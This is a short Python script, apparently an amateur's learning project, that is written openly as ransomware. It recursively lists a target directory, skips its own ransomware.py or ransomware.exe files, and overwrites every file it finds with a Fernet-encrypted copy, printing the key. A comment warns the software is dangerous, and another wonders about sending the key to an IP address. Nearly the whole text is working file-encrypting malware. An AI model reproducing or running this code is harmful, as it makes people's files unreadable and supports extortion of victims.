import os 
from cryptography.fernet import Fernet

# Dangerous software. I strongly advise using a virtual machine where your important files will not be at risk

TARGET_DIRECTORY_PATH = "target directory"  
target_directory = os.listdir(TARGET_DIRECTORY_PATH)  # creates a list of file/folders within target directory

key = Fernet.generate_key()
print(f"Key\n\n{key}")
# send key to an ip address? or would a hacker use the same key for all their victims? 


def encrypt_files(files):

    for file in files:

        with open(file, 'rb') as target_file:
            contents = target_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)

        with open(file, 'wb') as target_file:
            target_file.write(contents_encrypted)


def scour_directory(directory: list, path=TARGET_DIRECTORY_PATH):

    files = []

    for file in directory:
        if "ransomware.py" in file or "ransomware.exe" in file:
            continue

        elif os.path.isfile(f"{path}\\{file}"):  # additional \ needed for python strings
            files.append(f"{path}\\{file}")

        elif os.path.isdir(f"{path}\\{file}"):
            child_directory = os.listdir(f"{path}\\{file}")
            child_directory_path = f"{path}\\{file}"

            scour_directory(child_directory, child_directory_path)
        
    encrypt_files(files)


scour_directory(target_directory)
